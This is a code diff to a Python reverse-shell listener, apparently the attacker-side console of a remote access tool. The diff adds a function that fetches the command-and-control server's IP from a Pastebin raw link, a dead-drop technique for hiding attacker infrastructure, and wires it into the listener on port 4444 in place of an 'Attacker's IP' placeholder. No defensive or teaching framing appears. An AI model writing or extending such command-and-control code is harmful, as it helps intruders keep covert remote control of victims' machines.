@@ -2,6 +2,16 @@ import socket
 import json
 import base64
 import shlex
+import requests
+
+def fetch_c2_ip():
+    try:
+        # Replace this with your actual Pastebin or GitHub Gist RAW link
+        url = "https://pastebin.com/raw/AbCdEfGH"
+        response = requests.get(url, timeout=5)
+        return response.text.strip()
+    except:
+        return "Server down for pastebin"  # Fallback if config server is unreachable
 
 class Listener:
     def __init__(self, ip, port):
@@ -68,5 +78,5 @@ class Listener:
             print(result)  # Print the result
 
 
-my_listener = Listener("Attacker's IP",4444)  # Create an object of the class
+my_listener = Listener(fetch_c2_ip(), 4444)  # Create an object of the class
 my_listener.run()  # Call the run method
